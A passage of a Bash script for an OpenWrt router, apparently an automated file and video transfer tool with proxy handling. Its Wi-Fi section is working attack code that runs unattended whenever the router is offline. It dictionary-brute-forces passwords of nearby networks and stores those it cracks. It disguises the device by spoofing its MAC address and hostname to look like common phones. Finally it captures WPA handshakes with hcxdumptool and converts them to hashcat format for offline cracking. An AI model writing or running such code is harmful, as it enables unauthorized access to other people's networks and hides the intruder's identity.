                remote_file_size=$(echo "$verify_file_list" | grep -o "\"name\":\"${filename_name}\"[^}]*\"size\":[0-9]*" | sed -E 's/.*"size":([0-9]+).*/\1/')
            else
                local file_line=$(echo "$verify_file_list" | grep -o "{\"id\":\"[^\"]*\",\"name\":\"${filename_name}\",\"mimeType\":\"[^\"]*\",\"modifiedTime\":\"[^\"]*\",\"size\":\"[0-9]*\"}")
                if [ -n "$file_line" ]; then
                    remote_file_size=$(echo "$file_line" | sed -E 's/.*"size":"([0-9]+)".*/\1/')
                fi
            fi
            
            if [[ "$remote_file_size" == "$local_file_size" ]]; then
                echo -e "\033[1;32m✓ 完成 ($(format_size $local_file_size))\033[0m"
                blink_led "green" 3 1
                mkdir -p "${up_path}/成功"
                mv "$file" "${up_path}/成功"
            else
                echo -e "\033[1;31m✗ 校验失败\033[0m"
                blink_led "red" 3 1
                mkdir -p "${up_path}/失败"
                mv "$file" "${up_path}/失败"
            fi
        else
            echo -e "\033[1;31m✗ 上传失败\033[0m"
            blink_led "red" 3 1
            mkdir -p "${up_path}/失败"
            mv "$file" "${up_path}/失败"
        fi
        ((idx++))
    done

    if find "${up_path}" -maxdepth 1 -type f | read -r; then
        mkdir -p "${up_path}/不支持"
        find "${up_path}" -maxdepth 1 -type f -exec mv {} "${up_path}/不支持/" \;
    fi
}

# ------------------- 上传函数（遍历所有联系人）-------------------
function upload_files() {
    for contact_id in "${contacts[@]}"; do
        local arr_name="contact_${contact_id}"
        local -n contact_name="${arr_name}[name]"
        upload_files_for_contact "$contact_id" "$contact_name"
    done
}

# 下载视频的核心函数
download_videos() {
    # 检查是否下载视频
    if [[ -z "$down_video" ]]; then
        log_message green ""
        log_message yellow "已设置为不下载视频"
        return 0
    fi

    # 检查 aria2c 是否安装
    if ! command -v aria2c &> /dev/null; then
        log_message red "错误：未找到 aria2c，请先安装 aria2c。"
        return 1
    fi

    # 检查 curl 是否安装
    if ! command -v curl &> /dev/null; then
        log_message red "错误：未找到 curl，请先安装 curl。"
        return 1
    fi
    
    log_message green ""
    log_message green "***************** 文件下载完成,开始下载视频 *****************"

    # 测试域名并获取第一个可用的域名
    local selected_domain=$(test_domains "${video_domains[@]}")
    if [[ $? -ne 0 || -z "$selected_domain" ]]; then
        log_message red "错误: 没有可用的域名"
        return 1
    fi
    log_message green "已随机选择可用的域名: $selected_domain"

    # 确保临时目录存在
    tmp_dir="${video_path}/tmp"
    mkdir -p "$tmp_dir"

    # 下载 index.txt，设置 15 秒超时和最低速度
    log_message green "尝试从 $selected_domain 下载 index.txt "
    aria2c --check-certificate=false \
        --conditional-get=true \
        -x 4 -s 4 \
        --allow-overwrite=true \
        --file-allocation=none \
        --timeout=15 \
        --connect-timeout=10 \
        --lowest-speed-limit=1K \
        -d "$tmp_dir" \
        --console-log-level=warn \
        --quiet=true \
        "http://$selected_domain/index.txt"
    if [[ $? -ne 0 ]]; then
        log_message red "错误: 从 $selected_domain 下载 index.txt 超时或失败"
        return 1
    fi
#    log_message green "已下载 index.txt 到 $tmp_dir"

    # 检查 index.txt 是否下载成功
    index_file="$tmp_dir/index.txt"
    if [[ ! -f "$index_file" ]]; then
        log_message red "错误: 无法下载 index.txt"
        return 1
    fi

    # 读取 index.txt，追加新日期到视频下载记录
    video_log="${SCRIPT_DIR}/data/视频下载记录.txt"
    mkdir -p "$(dirname "$video_log")"
    while IFS= read -r date; do
        if [[ -n "$date" ]]; then
            if ! grep -E "^$date(=.*)?$" "$video_log" > /dev/null; then
                echo "$date" >> "$video_log"
#                log_message green "已追加日期 $date 到 $video_log ，请手动添加“=”下次自动下载。"
            fi
        fi
    done < "$index_file"

    # 检查并提醒没有标记 = 的日期（可下载的日期）
    log_message green "可以选择下载视频的日期："
    available_dates=()
    while IFS= read -r line; do
        if [[ -n "$line" && ! "$line" =~ = ]]; then
            available_dates+=("$line")
        fi
    done < "$video_log"
    if [[ ${#available_dates[@]} -eq 0 ]]; then
        log_message yellow "  - 无"
    else
        for date in "${available_dates[@]}"; do
            log_message yellow "  - $date"
        done
    fi

    # 显示已选择要下载的日期（标记了 = 但未标记已下载的日期）
    log_message green "已选择要下载视频的日期："
    selected_dates=()
    while IFS= read -r line; do
        if [[ "$line" =~ ^[0-9]{4}=$ ]]; then
            user_date="${line%=*}"
            selected_dates+=("$user_date")
        fi
    done < "$video_log"
    if [[ ${#selected_dates[@]} -eq 0 ]]; then
        log_message yellow "  - 无"
    else
        for date in "${selected_dates[@]}"; do
            log_message yellow "  - $date"
        done
    fi

    # 读取视频下载记录，处理带等号但未标记已下载的日期
    while IFS= read -r line; do
        if [[ "$line" =~ ^[0-9]{4}=$ ]]; then
            user_date="${line%=*}"
            log_message yellow "处理日期: $user_date"

            # 下载批量下载网址文件，设置 15 秒超时和最低速度
            batch_file="$tmp_dir/批量下载网址.txt"
#            log_message yellow "尝试下载 批量下载网址.txt 从 $selected_domain"
            aria2c --check-certificate=false \
                --conditional-get=true \
                -x 4 -s 4 \
                --allow-overwrite=true \
                --file-allocation=none \
                --timeout=15 \
                --connect-timeout=10 \
                --lowest-speed-limit=1K \
                -d "$tmp_dir" \
                --console-log-level=warn \
                --quiet=true \
                "http://$selected_domain/$user_date/批量下载网址.txt"
            if [[ $? -ne 0 || ! -f "$batch_file" ]]; then
                log_message red "错误: 从 $selected_domain 下载 $user_date 的批量下载网址.txt 超时或失败"
                continue
            fi
            log_message green "已下载 批量下载网址.txt 到 $tmp_dir"

            # 创建输出目录
            download_dir="$video_path/${user_date}_下载视频"
            mkdir -p "$download_dir"

            # 处理批量下载网址，替换域名
            output_urls=()
            while IFS= read -r url; do
                if [[ -n "$url" ]]; then
                    updated_url="${url//此处替换为自己的域名/$selected_domain}"
                    if [[ "$updated_url" == "$url" ]]; then
                        log_message yellow "警告: URL 未替换域名: $url"
                    fi
                    output_urls+=("$updated_url")
                fi
            done < "$batch_file"

            # 写入 URL 列表到临时文件
            output_urls_file="$tmp_dir/output_urls.txt"
            printf "%s\n" "${output_urls[@]}" > "$output_urls_file"

            # 显示要下载的文件列表
            log_message yellow "要下载的文件列表："
            if [[ ${#output_urls[@]} -eq 0 ]]; then
                log_message yellow "  无文件需要下载"
            else
                for url in "${output_urls[@]}"; do
                    # 提取文件名（URL的最后一部分）
                    filename=$(basename "$url")
                    log_message yellow "  - $filename"
                done
            fi

            # 设置最大重试次数
            max_retry=10
            retry=0

            # 下载文件并处理重试，设置 10 分钟超时
            while [[ $retry -le $max_retry ]]; do
                log_message yellow "正在从 $selected_domain 下载 $user_date 的文件... (尝试 $((retry + 1))/$((max_retry + 1)))"
                aria2c --check-certificate=false \
                    --conditional-get=true \
                    --continue=true \
                    --check-integrity=true \
                    --allow-overwrite=false \
                    -x 4 -s 4 \
                    --console-log-level=warn \
                    --file-allocation=prealloc \
                    --timeout=60 \
                    --connect-timeout=10 \
                    --lowest-speed-limit=1K \
                    -d "$download_dir" \
                    -i "$output_urls_file"

                if [[ $? -eq 0 ]]; then
                    log_message green "下载 $user_date 的文件成功"
                    sed -i "s/^$user_date=$/$user_date=已下载/" "$video_log"
                    log_message green "已将 $user_date 标记为已下载"
                    break
                else
                    ((retry++))
                    if [[ $retry -le $max_retry ]]; then
                        log_message yellow "第 $retry 次重试/共 $max_retry 次..."
                        sleep 5
                    else
                        log_message red "错误: 超过最大 $max_retry 次重试次数或下载超时"
                        break
                    fi
                fi
            done

            # 清理临时文件
            rm -f "$batch_file" "$output_urls_file" 2>/dev/null
        fi
    done < "$video_log"

    # 清理临时文件夹
    rm -rf "$tmp_dir" 2>/dev/null

#    log_message green "视频下载完成"
}

# ------------------- 结束提示 -------------------
function finish_message() {
    log_message green ""
    # 判断为 OpenWrt 系统执行关机，为其他系统执行退出代理
    if [ -f /etc/openwrt_release ] || uname -a | grep -q "OpenWrt"; then
      local green_led
      green_led=$(find_led "green") || return 1
      log_message green "路由器闪烁蓝灯 7 次后关机"
      blink_led blue 7 1
      sync
      kill -USR1 1
    else
      # 关闭自动打开的代理软件
      if [ ! -z "$auto_connect_tor" ]; then
        sudo pkill firefox.real  # 结束自动启动的tor进程
      fi

      if [ ! -z "$auto_connect_xray" ]; then
        sudo pkill xray  # 结束自动启动的xray进程
      fi

      if [ ! -z "$auto_connect_wj" ]; then
        sudo pkill $wujie_core  # 结束自动启动的无界进程
      fi


      if [ ! -z "$auto_connect_sf" ]; then
        sudo pkill psiphonGUI  # 结束自动启动的赛风进程
      fi
    fi

    log_message green "=================运行完毕,任意键重新开始==================="
    read
    $0
}

# ===================================
# WiFi自动连接功能（直接运行在OpenWrt上，使用iwinfo+uci方式）
# ===================================

WIFI_SCP_PATH="/etc/config/scp_pw"
WIFI_UPLOAD_PATH="/root/upload"

function init_wifi_env() {
    mkdir -p "$WIFI_SCP_PATH" 2>/dev/null
    mkdir -p "$WIFI_UPLOAD_PATH" 2>/dev/null
    touch "$wifi_cracked_file" 2>/dev/null
}

function install_wifi_tools() {
    log_message cyan "检查WiFi破解工具..."
    
    if ! command -v iwinfo >/dev/null 2>&1; then
        log_message yellow "安装iwinfo工具..."
        opkg update && opkg install iwinfo 2>/dev/null
    fi
    
    if ! command -v uci >/dev/null 2>&1; then
        log_message yellow "安装uci工具..."
        opkg update && opkg install uci 2>/dev/null
    fi
}

function get_wireless_driver() {
    local freq="$1"
    local driver=""
    
    local driverNum=$(uci get wireless.globals.wirelessNum 2>/dev/null)
    if [ -z "$driverNum" ]; then
        log_message red "没有找到无线驱动"
        return 1
    fi
    
    if [ "$driverNum" == "1" ]; then
        driver="radio0"
        local dirverFreq=$(uci get wireless.radio0.freqValue 2>/dev/null)
        if [ -n "$dirverFreq" ]; then
            echo "$dirverFreq" > /tmp/ghzNum
        fi
    else
        case $freq in
            2)
                driver=$(uci show wireless | grep "freqValue='2'" | cut -d "." -f 2 | head -1)
                echo "2" > /tmp/ghzNum
                ;;
            5)
                driver=$(uci show wireless | grep "freqValue='5'" | cut -d "." -f 2 | head -1)
                echo "5" > /tmp/ghzNum
                ;;
            *)
                driver=$(uci show wireless | grep "freqValue='2'" | cut -d "." -f 2 | head -1)
                echo "2" > /tmp/ghzNum
                ;;
        esac
    fi
    
    if [ -z "$driver" ]; then
        driver="radio0"
    fi
    
    echo "$driver"
}

function scan_wifi_networks() {
    local driver="$1"
    local ghz="$2"
    
    [ -f /tmp/wifiOK ] && rm -f /tmp/wifiOK
    [ -f /tmp/OK.txt ] && rm -f /tmp/OK.txt
    [ -f /tmp/wifi.txt ] && rm -f /tmp/wifi.txt
    
    for i in $(seq 2); do
        iwinfo "${driver}" scan > /dev/null
        [ "$i" -eq "2" ] && iwinfo "${driver}" scan > /tmp/wifi.txt
    done
    
    [ ! -f /tmp/wifi.txt ] && log_message red "扫描WiFi失败" && return 1
    
    grep 'ESSID' /tmp/wifi.txt | awk -F'ESSID: "' '{printf("%s\n", $2)}' | sed 's/"$//g' | sed 's/ /@##@/g' > /tmp/name.txt
    grep 'Address' /tmp/wifi.txt | sed 's/Address: //g' > /tmp/mac.txt
    grep 'Signal' /tmp/wifi.txt | awk '{print $1 " " $2 $3}' | sed 's/Signal: //g' > /tmp/signal.txt
    grep 'Channel:' /tmp/wifi.txt | cut -d ':' -f 3 | sed '/^$/d' > /tmp/channel.txt
    
    local wifi_total=$(wc -l < /tmp/name.txt)
    for count in $(seq 1 "$wifi_total"); do
        local wifi_na="$(sed -n "${count}p" /tmp/name.txt)"
        [ -z "${wifi_na}" ] && continue
        
        local wifi_ma="$(sed -n "${count}p" /tmp/mac.txt)"
        local wifi_sg="$(sed -n "${count}p" /tmp/signal.txt)"
        local wifi_ch="$(sed -n "${count}p" /tmp/channel.txt)"
        
        if [ -n "$(grep "2" /tmp/ghzNum)" ]; then
            [ "$wifi_ch" -gt "14" ] && continue
        elif [ -n "$(grep "5" /tmp/ghzNum)" ]; then
            [ "$wifi_ch" -le "14" ] && continue
        fi
        
        echo -e "\t${wifi_sg}\t${wifi_na}\t${wifi_ma}\t${wifi_ch}" >> /tmp/OK.txt
    done
    
    [ ! -f /tmp/OK.txt ] && log_message red "没有扫描到WiFi" && return 1
    sort -r -n -k 2 -t - /tmp/OK.txt | awk '{print FNR "" $0}' > /tmp/wifiOK
    
    return 0
}

function print_wifi_list() {
    local wifi_num=$(wc -l < /tmp/wifiOK)
    log_message green "扫描到 $wifi_num 个WiFi信号:"
    echo ""
    
    for i in $(seq 1 "$wifi_num"); do
        local mesg=$(sed -n "${i}p" /tmp/wifiOK)
        local num=$(echo "$mesg" | awk -F"\t" '{printf("%s",$1)}')
        local signal=$(echo "$mesg" | awk -F"\t" '{printf("%s",$2)}')
        local essid=$(echo "$mesg" | awk -F"\t" '{printf("%s",$3)}' | sed 's/@##@/ /g')
        local address=$(echo "$mesg" | awk -F"\t" '{printf("%s",$4)}')
        local channel=$(echo "$mesg" | awk -F"\t" '{printf("%s",$5)}')
        
        log_message yellow "  [$num] 信号:$signal SSID:$essid MAC:$address 信道:$channel"
    done
    echo ""
}

function get_wifi_info_by_num() {
    local num="$1"
    local wifi_na="$(sed -n "${num}p" /tmp/wifiOK | awk -F"\t" '{print $3}' | sed 's/@##@/ /g')"
    local wifi_ma="$(sed -n "${num}p" /tmp/wifiOK | awk -F"\t" '{print $4}')"
    local wifi_ch="$(sed -n "${num}p" /tmp/wifiOK | awk -F"\t" '{print $5}')"
    
    echo "$wifi_na|$wifi_ma|$wifi_ch"
}

function clear_wifi_interface() {
    local del_num="$(uci show wireless 2>/dev/null | grep "disabled='0'" | grep -v "radio" | cut -d "." -f 2)"
    for i in $del_num; do
        uci del wireless."$i" 2>/dev/null
    done
    uci commit wireless 2>/dev/null
    wifi down 2>/dev/null
    sleep 2
}

function add_wifi_network() {
    local ssid="$1"
    local bssid="$2"
    local password="$3"
    local device="$4"
    
    clear_wifi_interface
    
    local get_interface=""
    for i in $(seq 1000); do
        [ -z "$(grep "wwan$i" /etc/config/network 2>/dev/null)" ] && { get_interface="wwan$i"; break; }
    done
    
    [ -z "$get_interface" ] && get_interface="wwan1"
    
    uci set network."$get_interface"=interface
    uci set network."$get_interface".proto=dhcp
    uci commit network
    
    uci set wireless."$device".channel='auto' 2>/dev/null
    uci set wireless."$device".htmode='HT40' 2>/dev/null
    uci set wireless."$device".txpower='23' 2>/dev/null
    
    local wifi_iface_num=0
    for i in $(seq 0 100); do
        [ -z "$(uci show 2>/dev/null | grep "wifinet$i")" ] && { wifi_iface_num="$i"; break; }
    done
    
    local wifi_interface="wifinet${wifi_iface_num}"
    
    uci set wireless."$wifi_interface"=wifi-iface
    uci set wireless."$wifi_interface".device="$device"
    uci set wireless."$wifi_interface".mode='sta'
    uci set wireless."$wifi_interface".ssid="$ssid"
    uci set wireless."$wifi_interface".bssid="$bssid"
    
    if [ -n "$password" ]; then
        uci set wireless."$wifi_interface".encryption='psk2'
        uci set wireless."$wifi_interface".key="$password"
    else
        uci set wireless."$wifi_interface".encryption='none'
    fi
    
    uci set wireless."$wifi_interface".disabled='1'
    uci set wireless."$wifi_interface".network="$get_interface"
    uci commit wireless
    
    uci set wireless."$wifi_interface".disabled='0'
    uci set wireless."$wifi_interface".dtim_period='1'
    uci set wireless."$wifi_interface".disassoc_low_ack='0'
    uci set wireless."$device".disabled='0'
    uci del wireless."$device".txpower 2>/dev/null
    uci set wireless."$device".htmode='HT20'
    uci commit
    wifi up 2>/dev/null
    
    echo "$get_interface"
}

function test_wifi_connected() {
    sleep 8
    
    local retries=5
    while [ $retries -gt 0 ]; do
        if ping -c 1 -W 3 8.8.8.8 >/dev/null 2>&1; then
            return 0
        fi
        sleep 3
        ((retries--))
    done
    return 1
}

function save_wifi_password() {
    local ssid="$1"
    local bssid="$2"
    local password="$3"
    
    if ! grep -q "$ssid" "$wifi_cracked_file" 2>/dev/null; then
        cat >> "$wifi_cracked_file" << EOF

Wifi名称：$ssid
Wifi地址：$bssid
Wifi密码：$password

EOF
        log_message green "已保存WiFi密码到本地"
    fi
}

# WiFi是否需要改MAC（配置项）
WIFI_MAC_FILE="/etc/config/scp/mac.txt"

function add_sta_mac_list() {
    [ ! -f "$WIFI_MAC_FILE" ] && cat > "$WIFI_MAC_FILE" <<-"EOF"
vivo-Y31s@4E:22:6F
iPhone@A0:3B:E3
vivo-Y53s@B2:46:E0
vivo-X50-Pro@42:3A:E0
HUAWEI-Mate-30@C2:79:49
HUAWEI-Mate-40-Pro@02:6D:89
vivo-X70-Pro@F2:9D:D4
iQOO-Z3@1A:EB:3A
Galaxy-S20@60:f1:89
OPPO-A53-5G@A8:98:92
HUAWEI-P40@32:2A:7D
HUAWEI-P30@24:DA:33
iPad@DE:E0:C7
Redmi-Note-11-5G@FC:D9:08
Xiaomi-Civi@92:21:09
vivo-Y30@1A:FC:EA
HUAWEI-Mate-60-Pro@12:CE:0F
EOF
}

function get_mac_name() {
    local sta_mac_textPath="$WIFI_MAC_FILE"
    [ ! -e "$sta_mac_textPath" ] && return 2
    
    local lineNum="$(wc -l < "$sta_mac_textPath")"
    [ "$lineNum" -eq 1 ] && return 2
    
    local count=1
    while :; do
        local a="$(head -n 2 /dev/urandom | md5sum | cut -c 1-3)"
        a=$(printf %d "0x$a")
        local b="$(head -n 2 /dev/urandom | md5sum | cut -c 4-6)"
        b=$(printf %d "0x$b")
        randomLineNum=$(( ((a + b) % lineNum) + 1 ))
        if [ "$randomLineNum" -gt "0" ] && [ "$randomLineNum" -le "$lineNum" ]; then
            break
        elif [ $count -ge 5 ]; then
            return 3
        fi
        count=$(( count + 1 ))
    done
    
    local aheadMac="$(sed -n "$randomLineNum p" "$sta_mac_textPath" | cut -d "@" -f 2)"
    local backMac="$(head -n 2 /dev/urandom | md5sum | cut -c 1-6 | awk '{printf "%s:%s:%s", substr($1,1,2), substr($1,3,2), substr($1,5,2)}' | awk '{print toupper($0)}')"
    host_name=$(sed -n "$randomLineNum p" "$sta_mac_textPath" | cut -d "@" -f 1)
    wifi_macaddr="$aheadMac:$backMac"
    
    [ -z "$host_name" ] || [ -z "$wifi_macaddr" ] && return 1
    return 0
}

function change_wifi_mac() {
    log_message cyan "开始更改WiFi身份信息..."
    
    mkdir -p "/etc/config/scp" 2>/dev/null
    add_sta_mac_list
    get_mac_name
    [ $? -ne 0 ] && { log_message red "获取伪装MAC失败"; return 1; }
    
    local wifi_interface=$(uci show wireless 2>/dev/null | grep "mode='sta'" | head -1 | cut -d "." -f 2)
    [ -z "$wifi_interface" ] && wifi_interface=$(uci show wireless 2>/dev/null | grep "wifinet" | grep "mode='sta'" | head -1 | cut -d "." -f 2)
    
    if [ -n "$wifi_interface" ]; then
        local pci_name=$(uci get wireless."$wifi_interface".network 2>/dev/null)
        [ -n "$pci_name" ] && uci set network."$pci_name".hostname="$host_name" 2>/dev/null
        uci set wireless."$wifi_interface".macaddr="$wifi_macaddr" 2>/dev/null
        uci commit
        log_message green "MAC地址已更改: $wifi_macaddr"
        log_message green "主机名已更改: $host_name"
        wifi up 2>/dev/null
        sleep 3
    else
        log_message yellow "未找到已连接的WiFi，跳过MAC更改"
    fi
    
    return 0
}

function try_known_wifi() {
    log_message cyan "尝试连接已知WiFi..."
    
    [ ! -f "$wifi_cracked_file" ] || [ ! -s "$wifi_cracked_file" ] && return 1
    
    while IFS= read -r line; do
        if echo "$line" | grep -q "Wifi名称："; then
            known_ssid=$(echo "$line" | sed 's/Wifi名称：//' | tr -d ' ')
        elif echo "$line" | grep -q "Wifi密码："; then
            known_password=$(echo "$line" | sed 's/Wifi密码：//' | tr -d ' ')
            
            [ -z "$known_ssid" ] || [ -z "$known_password" ] && continue
            
            log_message yellow "尝试连接: $known_ssid"
            
            local driver=$(get_wireless_driver "2")
            [ -z "$driver" ] && continue
            
            clear_wifi_interface
            sleep 1
            
            add_wifi_network "$known_ssid" "" "$known_password" "$driver"
            
            if test_wifi_connected; then
                log_message green "成功连接到已知WiFi: $known_ssid"
                return 0
            fi
            
            known_ssid=""
            known_password=""
        fi
    done < "$wifi_cracked_file"
    
    return 1
}

function crack_wifi_with_password() {
    log_message cyan ""
    log_message cyan "========== 开始弱密码破解WiFi =========="
    
    for freq in 2 5; do
        log_message yellow "扫描${freq}G频段..."
        
        local driver=$(get_wireless_driver "$freq")
        [ -z "$driver" ] && continue
        
        if ! scan_wifi_networks "$driver" "$freq"; then
            log_message yellow "扫描${freq}G失败，跳过"
            continue
        fi
        
        print_wifi_list
        
        local wifi_num=$(wc -l < /tmp/wifiOK)
        for i in $(seq 1 "$wifi_num"); do
            local ssid="$(sed -n "${i}p" /tmp/wifiOK | awk -F"\t" '{print $3}' | sed 's/@##@/ /g')"
            local bssid="$(sed -n "${i}p" /tmp/wifiOK | awk -F"\t" '{print $4}')"
            
            [ -z "$ssid" ] && continue
            
            if grep -q "^${ssid}$" /tmp/wifi_over 2>/dev/null; then
                log_message yellow "跳过失败过的WiFi: $ssid"
                continue
            fi
            
            if grep -q "$ssid" "$wifi_cracked_file" 2>/dev/null; then
                log_message yellow "跳过已破解的WiFi: $ssid"
                continue
            fi
            
            log_message cyan "尝试破解: $ssid"
            
            if [ ! -f "$wifi_password_file" ]; then
                log_message red "未找到密码字典: $wifi_password_file"
                continue
            fi
            
            while IFS= read -r pwd; do
                [ -z "$pwd" ] && continue
                
                log_message yellow "  尝试密码: $pwd"
                
                clear_wifi_interface
                sleep 1
                
                add_wifi_network "$ssid" "$bssid" "$pwd" "$driver"
                
                if test_wifi_connected; then
                    log_message green "破解成功！SSID: $ssid -> 密码: $pwd"
                    save_wifi_password "$ssid" "$bssid" "$pwd"
                    return 0
                fi
                
            done < "$wifi_password_file"
            
            echo "$ssid" >> /tmp/wifi_over
            log_message red "WiFi $ssid 破解失败"
            
        done
    done
    
    return 1
}

function capture_with_hcxdumptool() {
    log_message cyan ""
    log_message cyan "========== 开始hcxdumptool自动抓包 =========="
    
    if ! command -v hcxdumptool >/dev/null 2>&1; then
        log_message yellow "hcxdumptool未安装，尝试安装..."
        opkg update && opkg install hcxdumptool 2>/dev/null
    fi
    
    if ! command -v hcxdumptool >/dev/null 2>&1; then
        log_message red "hcxdumptool安装失败，跳过抓包"
        return 1
    fi
    
    local capture_file="$wifi_capture_dir/capture_$(date +%Y%m%d_%H%M%S).pcapng"
    mkdir -p "$wifi_capture_dir"
    
    local driver=$(get_wireless_driver "2")
    [ -z "$driver" ] && return 1
    
    local wlan_int="wlan0"
    ip link set "$wlan_int" up 2>/dev/null
    
    log_message yellow "开始抓包，60秒后自动停止..."
    log_message yellow "抓包保存到: $capture_file"
    
    hcxdumptool -i "$wlan_int" -o "$capture_file" --filtermode=2 --enable_status=1 &
    local hcxd_pid=$!
    
    sleep 60
    
    kill $hcxd_pid 2>/dev/null
    sleep 2
    
    if [ -f "$capture_file" ] && [ -s "$capture_file" ]; then
        log_message green "抓包完成: $capture_file"
        ls -lh "$capture_file"
        
        if command -v tcpdump >/dev/null 2>&1; then
            local cap_file="${capture_file%.pcapng}.cap"
            log_message yellow "转换为cap格式: $cap_file"
            tcpdump -w "$cap_file" -r "$capture_file" 2>/dev/null
            if [ -f "$cap_file" ] && [ -s "$cap_file" ]; then
                log_message green "cap转换成功: $cap_file"
            else
                log_message red "cap转换失败"
            fi
        else
            log_message yellow "tcpdump未安装，跳过cap转换"
        fi
        
        if command -v hcxpcapngtool >/dev/null 2>&1; then
            local hash_file="$wifi_capture_dir/$(date +%Y%m%d_%H%M%S).hc22000"
            log_message yellow "转换为hc22000格式: $hash_file"
            hcxpcapngtool -o "$hash_file" "$capture_file" 2>/dev/null
            if [ -f "$hash_file" ] && [ -s "$hash_file" ]; then
                log_message green "转换成功: $hash_file"
            else
                log_message red "转换失败"
            fi
        else
            log_message yellow "hcxpcapngtool未安装，跳过转换"
        fi
        
        return 0
    else
        log_message red "抓包失败或文件为空"
        return 1
    fi
}

function wifi_auto_connect() {
    if ! grep -q "OpenWrt" /etc/os-release 2>/dev/null && ! grep -q "LEDE" /etc/os-release 2>/dev/null; then
        log_message yellow "WiFi破解功能仅支持OpenWrt系统，跳过"
        return 1
    fi
    
    if [ "$enable_wifi_crack" != "true" ]; then
        log_message yellow "WiFi破解功能已禁用，跳过"
        return 1
    fi
    
    mkdir -p "$wifi_capture_dir" 2>/dev/null
    init_wifi_env
    install_wifi_tools
    touch "/tmp/wifi_over" 2>/dev/null
    
    log_message cyan ""
    log_message cyan "==========================="
    log_message cyan "    WiFi自动连接功能"
    log_message cyan "==========================="
    
    log_message cyan ""
    log_message cyan "步骤1: 检查是否需要改MAC..."
    if [ "$wifi_change_mac" = "true" ]; then
        log_message yellow "配置要求更换MAC地址..."
        change_wifi_mac
        if [ $? -eq 0 ]; then
            log_message green "MAC更改成功，设置配置为不需要再改..."
            wifi_change_mac="false"
            sed -i 's/wifi_change_mac=.*/wifi_change_mac="false"/' "${SCRIPT_DIR}/RouterHub_v0.1.sh" 2>/dev/null
        fi
        sleep 3
    else
        log_message yellow "配置未启用更换MAC，跳过"
    fi
    
    log_message cyan ""
    log_message cyan "步骤2: 检查当前网络状态..."
    if ping -c 2 -W 3 8.8.8.8 >/dev/null 2>&1; then
        log_message green "网络已连接，跳过WiFi破解"
        return 0
    fi
    log_message yellow "网络未连接，继续尝试WiFi连接..."
    
    log_message cyan ""
    log_message cyan "步骤3: 尝试已知WiFi..."
    if try_known_wifi; then
        log_message green "联网成功！"
        return 0
    fi
    
    log_message cyan ""
    log_message cyan "步骤3: 尝试弱密码破解..."
    if crack_wifi_with_password; then
        log_message green "联网成功！"
        return 0
    fi
    
    log_message cyan ""
    log_message cyan "步骤4: 弱密全部失败，开始hcxdumptool抓包..."
    if capture_with_hcxdumptool; then
        log_message yellow "抓包完成"
    else
        log_message red "抓包失败"
    fi
    
    log_message red ""
    log_message red "========== 所有方法失败，准备关机 =========="
    log_message red "抓包文件保存在: $wifi_capture_dir"
    
    sync
    poweroff
    
    return 1
}

# ===================================
# 主逻辑部分
# 包含主流程，调用各功能函数
# ===================================

# ------------------- 主流程 -------------------
function main() {
    
    # 步骤1: 校准时间
    set_time_or_proxy
    
    # 步骤2: 检测到网络
    check_net_status
    local_network_ok=$?
    
    # 步骤3: 如果网络不通，先尝试WiFi破解
    if [ $local_network_ok -ne 0 ]; then
        log_message yellow "网络连接失败，开始自动破解WiFi..."
        wifi_auto_connect
        
        # 破解后再次检测到网络
        sleep 5
        if ping -c 1 -W 5 8.8.8.8 >/dev/null 2>&1; then
            log_message green "WiFi破解成功，网络已连接"
            local_network_ok=0
        else
            log_message red "WiFi破解失败，准备关机..."
            blink_led "red" 7 0
            sleep 3
            sync
            poweroff
            exit 0
        fi
    fi
    
    # 步骤4: 执行正常任务
    log_message green "网络连接正常，开始执行任务..."
    check_variables
    
    for contact_id in "${contacts[@]}"; do
        local arr_name="contact_${contact_id}"
        local -n contact_name="${arr_name}[name]"
        download_files_for_contact "$contact_id" "$contact_name"
        upload_files_for_contact "$contact_id" "$contact_name"
    done
    
    download_videos
    
    # 步骤5: 完成任务后关机
    finish_message
}

# 执行主流程
main
